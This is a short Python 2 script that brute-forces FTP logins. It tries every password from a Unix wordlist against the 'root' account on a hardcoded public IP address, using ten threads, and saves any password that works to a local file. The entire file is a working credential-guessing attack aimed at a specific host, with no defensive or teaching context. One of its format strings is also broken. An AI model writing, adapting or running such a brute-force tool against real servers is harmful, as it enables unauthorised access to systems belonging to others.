# coding: utf-8
from ftplib import FTP
from multiprocessing.pool import ThreadPool, Pool


def check_ftp(password):
    try:
        print(repr(password))
        FTP("114.55.176.50", 'root', password)
        with open('/Users/a0x55aa/aa.txt', 'w') as f:
            f.write(password)
    except Exception, e:
        print(e)
        if e[0] == '530 Login incorrect':
            print(e[0])
            print("login fail {}!".format(password))
        else:
            # print(e)
            print("connect fail {}:{}".format(password))


tpool = ThreadPool(10)
with open("/Users/a0x55aa/tmp/password-dictionaries/dictionaries/unix-fresh-scanner.txt") as f:
    for l in f:
        print(l)
        tpool.apply_async(check_ftp, (l.strip(), ))

tpool.close()
tpool.join()
